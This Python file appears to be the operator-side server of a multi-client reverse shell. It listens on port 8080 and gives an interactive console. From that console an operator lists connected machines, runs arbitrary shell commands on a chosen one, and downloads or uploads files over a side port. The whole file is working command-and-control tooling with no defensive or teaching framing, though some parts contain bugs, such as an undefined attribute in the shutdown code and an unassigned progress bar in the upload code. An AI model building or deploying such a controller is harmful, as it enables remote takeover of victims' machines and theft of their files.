import socket, subprocess, re, os, tqdm
from threading import Thread

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080
BUFFER_SIZE = 1440 # Max size of message
SEPERATOR = "<sep>"

class Server:
  def __init__(self, host, port):
    self.host = host
    self.port = port
    # Initialize server socket
    self.server_socket = self.get_server_socket()
    # Dictionary of client address and socket
    self.client = {}
    # Dictionary of client cwd
    self.client_cwd = {}
    # Current client interacting with
    self.current_client = None
  def get_server_socket(self, custom_port = None):
    # Create socket object
    soc = socket.socket()
    if custom_port:
      port = custom_port
    else:
      port = self.port
    print("Starting server ...")
    soc.bind((self.host, port))
    # Make port reusable
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    soc.listen(5)
    print(f"Listening as {SERVER_HOST}:{port} ...")
    return soc
  def accept_connection(self):
    while True:
      try:
        client_socket, client_addres = self.server_socket.accept()
      except OSError as e:
        print("Server socket closed, Existing ...")
        break
      print(f"Server {client_addres[0]}:{client_addres[1]} connected ...")
      cwd = client_socket.recv(BUFFER_SIZE).decode()
      print("[+] Current working on directory: ", cwd)
      # Add client into dictionary
      self.client[client_addres] = client_socket
      self.client_cwd[client_addres] = cwd
  def accept_connections(self):
    self.connection_thread = Thread(target=self.accept_connection)
    self.connection_thread.daemon = True
    self.connection_thread.start()
  def close_connection(self):
    """Close all client socket and server socket
       Used for closing program"""
    for _, client_socket in self.client_addres.items():
      client_socket.close()
    self.server_socket.close()
  def start_console(self):
    while True:
      command = input("$: ")
      if re.search(r"help\w*", command):
        print("Console command:")
        print("- help: See all command information")
        print("- list: List all connected user")
        print("- use [index]: Start reverse shell on the specified client, e.g 'use 1'\nwill start the reverse shell on the second connected machine, and 0 for the first one.")
        print("Custom command on reverse shell")
        print("- abort: Remove client from connected user.")
        print("- quit|exit: Back into console without removing client.")
        print("- download: Download specific file from client.")
        print("- upload: Upload specific file from local mechine.")
      elif re.search(r"list\w*", command):
        connected_client = []
        for index, ((client_host, client_port), cwd) in enumerate(self.client_cwd.items()):
          connected_client.append([index, client_host,
client_port, cwd])
        for i in connected_client:
          print(f"[Index]: {i}")
      elif (match := re.search(r"use\s*(\w*)", command)):
        try:
          client_index = int(match.group(1))
        except ValueError:
          print("Please insert number index client, See list.")
          continue
        else:
          try:
            self.current_client = list(self.client)[client_index]
          except IndexError:
            print(f"Please insert invalid index. Maximum is {len(self.client)}")
            continue
          else:
            self.start_reverse_shell()
      elif command.lower() in ["exit", "quit"]:
        break
      elif command == "":
        pass
      else:
        print(f"Command {command} not found!. See help.")
    self.close_connection()
  def start(self):
    self.accept_connections()
    self.start_console()
  def start_reverse_shell(self):
    cwd = self.client_cwd[self.current_client]
    client_socket = self.client[self.current_client]
    while True:
      command = input(f"{cwd} $: ")
      if not command.strip():
        continue
      if (match := re.search(r"local\s*(.*)", command)):
        local_command = match.group(1)
        if (cd_match := re.search(r"cd\s*(.*)", local_command)):
          cd_path = cd_match.group(1)
          if cd_path:
            os.chdir(cd_path)
        else:
          local_output = subprocess.getoutput(local_command)
          print(local_output)
        continue
      client_socket.sendall(command.encode())
      if command.lower() in ["quit", "exit"]:
        break
      elif command.lower() == "abort":
        del self.client[self.current_client]
        del self.client_cwd[self.current_client]
        break
      elif (match := re.search(r"download\s*(.*)", command)):
        self.recive_file()
      elif (match := re.search(r"upload\s*(.*)", command)):
        filename = match.group(1)
        if not os.path.isfile(filename):
          print(f"File {filename} not found!")
        else:
          self.send_file(filename)
      
      output = self.recive_all_data(client_socket, BUFFER_SIZE).decode()
      results, cwd = output.split(SEPERATOR)
      self.client_cwd[self.current_client] = cwd
      print(results)
    self.current_client = None
  def recive_all_data(self, socket, buffer_size):
    data = b""
    while True:
      output = socket.recv(buffer_size)
      data += output
      if not output or len(output) < buffer_size:
        break
    return data
  def recive_file(self, port=5000):
    soc = self.get_server_socket(custom_port=port)
    client_socket, client_addres = soc.accept()
    print(f"{client_addres} connected!")
    Server._recive_file(client_socket)
  def send_file(self, filename, port=5000):
    soc = self.get_server_socket(custom_port=port)
    client_socket, client_addres = soc.accept()
    print(f"{client_addres} connected!")
    Server._send_file(client_socket, filename)
  
  
  @classmethod
  def _recive_file(cls, soc: socket.socket, buffer_size=4096):
    recived = soc.recv(buffer_size).decode()
    filename, filesize = recived.split(SEPERATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, 'wb') as f:
      while True:
        bytes_read = soc.recv(buffer_size)
        if not bytes_read:
          break
        f.write(bytes_read)
        progress.update(len(bytes_read))
    soc.close()
  @classmethod
  def _send_file(cls, soc: socket.socket, filename, buffer_size=4096):
    filesize = os.path.getsize(filename)
    soc.send(f"{filename}{SEPERATOR}{filesize}".encode())
    tqdm.tqdm(range(filesize), f"Sending {filename}",
unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, 'rb') as f:
      while True:
        bytes_read = f.read(buffer_size)
        if not bytes_read:
          break
        soc.sendall(bytes_read)
        progress.update(len(bytes_read))
    soc.close()
if __name__ == "__main__":
  server = Server(SERVER_HOST, SERVER_PORT)
  server.start()